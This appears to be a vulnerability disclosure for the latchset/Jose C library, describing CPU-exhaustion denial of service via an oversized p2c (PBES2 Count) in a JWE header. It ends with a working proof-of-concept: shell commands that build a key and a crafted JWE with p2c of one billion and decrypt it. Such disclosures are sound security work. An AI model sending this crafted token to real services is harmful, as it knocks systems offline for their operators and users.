# latch-jose

## Summary

latchset/Jose version 11 allow attackers to cause a denial of service (CPU consumption) via a large p2c (aka PBES2 Count) value in a JOSE header.

## Description

latchset/Jose is a C module implementing JOSE(Json Object Signing and Encrypting) technologies.

The JWE key management algorithms based on PBKDF2 require a JOSE Header Parameter called p2c (PBES2 Count). This parameter dictates the number of PBKDF2 iterations needed to derive a CEK wrapping key. Its primary purpose is to intentionally slow down the key derivation function, making password brute-force and dictionary attacks more resource- intensive.

Therefore, if an attacker sets the p2c parameter in JWE to a very large number, it can cause a lot of computational consumption, resulting in a DOS attack.

## Poc

```sh
echo '{"alg":"PBES2-HS256+A128KW","k":"VHBLJ4-PmnqELoKbQoXuRA","key_ops":["wrapKey","unwrapKey"],"kty":"oct"}' > jwk
echo '{"ciphertext":"aaPb-JYGACs-loPwJkZewg","encrypted_key":"P1h8q8wLVxqYsZUuw6iEQTzgXVZHCsu8Eik-oqbE4AJGIDto3gb3SA","header":{"alg":"PBES2-HS256+A128KW","p2c":1000000000,"p2s":"qUQQWWkyyIqculSiC93mlg"},"iv":"Clg3JX9oNl_ck3sLSGrlgg","protected":"eyJlbmMiOiJBMTI4Q0JDLUhTMjU2In0","tag":"i7vga9tJkwRswFd7HlyD_A"}' > jwe
jose jwe dec -i ./jwe -k ./jwk
```

